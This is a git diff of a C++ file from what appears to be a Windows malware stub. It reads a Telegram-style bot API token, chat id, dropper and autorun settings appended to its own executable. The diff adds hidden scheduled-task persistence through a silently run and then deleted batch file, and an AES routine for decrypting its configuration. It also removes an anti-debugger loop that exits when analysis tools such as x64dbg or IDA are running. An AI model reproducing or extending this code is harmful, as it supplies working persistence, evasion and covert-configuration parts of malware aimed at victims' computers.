@@ -25,13 +25,6 @@ SOFTWARE.
 #include "Manager.h"
 #include "Requests.h"
 
-long GetFileSize(const char* filename)
-{
-    struct stat stat_buf;
-    int rc = stat(filename, &stat_buf);
-    return rc == 0 ? stat_buf.st_size : -1;
-}
-
 void ReadData(Settings* s) {
 	char mePath[128] = { 0 };
 	GetModuleFileNameA(NULL, mePath, sizeof(mePath) - 1);
@@ -42,6 +35,8 @@ void ReadData(Settings* s) {
 	stub.seekg(filesize);
 
 	stub.read((char*)&s->botapi, sizeof(s->botapi));
+	stub.read((char*)&s->key, sizeof(s->key));
+
 	stub.read((char*)&s->chatid, sizeof(s->chatid));
 	stub.read((char*)&s->drop, sizeof(s->drop));
 	stub.read((char*)&s->drop_run, sizeof(bool));
@@ -54,7 +49,7 @@ void ReadData(Settings* s) {
 	stub.read((char*)&s->autorun_state, sizeof(bool));
 
 	stub.read((char*)&s->auto_delete, sizeof(bool));
-	stub.read((char*)&s->protect_debuggers, sizeof(bool));
+	stub.read((char*)&s->protector, sizeof(bool));
 
 	stub.close();
 }
@@ -76,42 +71,36 @@ void Scheduler(const char* path, const char* name) {
 	schd.close();
 
 	ShellExecuteA(0, "open", "scheduler.bat", 0, 0, SW_HIDE);
+	Sleep(2000);
+	DeleteFileA("scheduler.bat");
 }
 
-std::string ToLower(std::string str) {
-	std::string lower = "";
-	std::transform(str.begin(), str.end(), lower.begin(), ::tolower);
-	return lower;
-}
-
-void Protector() {
-	HANDLE hSnap;
-	PROCESSENTRY32 pe32;
-	pe32.dwSize = sizeof(PROCESSENTRY32);
-
-	std::vector<std::string> processes = { "x64dbg", "x32dbg", "ollydbg", "ida", "debugger", "sniffer", "process"};
-	std::string process = "";
-	while (true) {
-		Sleep(3000);
-		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-		if (hSnap != NULL) {
-			if (Process32First(hSnap, &pe32)) {
-				do {
-					process = ToLower(pe32.szExeFile);
-					for (int i = 0; i < processes.size(); i++) {
-						if (process.find(processes[i]) != std::string::npos) {
-							ExitProcess(0);
-						}
-					}
-				} while (Process32Next(hSnap, &pe32));
-			}
-		}
-	}
+long GetFileSize(const char* filename) {	
+	struct stat stat_buf;
+	int rc = stat(filename, &stat_buf);
+	return rc == 0 ? stat_buf.st_size : -1;
 }
 
 bool FileExists(std::string name) {
 	struct stat buffer;
 	return (stat(name.c_str(), &buffer) == 0);
+}
+
+std::string DecryptStr(std::string text, std::string key) {
+	byte bKey[CryptoPP::AES::DEFAULT_KEYLENGTH], iv[CryptoPP::AES::BLOCKSIZE];
+	memcpy(bKey, key.c_str(), CryptoPP::AES::DEFAULT_KEYLENGTH);
+	memset(iv, 0x00, CryptoPP::AES::BLOCKSIZE);
+
+	std::string result = "";
+
+	CryptoPP::AES::Decryption aesDecryption(bKey, CryptoPP::AES::DEFAULT_KEYLENGTH);
+	CryptoPP::ECB_Mode_ExternalCipher::Decryption ebcDecryption(aesDecryption, iv);
+
+	CryptoPP::StreamTransformationFilter stfEncryptor(ebcDecryption, new CryptoPP::StringSink(result));
+	stfEncryptor.Put(reinterpret_cast<const unsigned char*>(text.c_str()), text.length());
+	stfEncryptor.MessageEnd();
+
+	return result;
 }
 
 std::vector<std::string> split(std::string str, char delim) {
@@ -123,4 +112,10 @@ std::vector<std::string> split(std::string str, char delim) {
 		splittened.push_back(word);
 	}
 	return splittened;
+}
+
+std::string ToLower(std::string str) {
+	std::string lower = "";
+	std::transform(str.begin(), str.end(), lower.begin(), ::tolower);
+	return lower;
 }
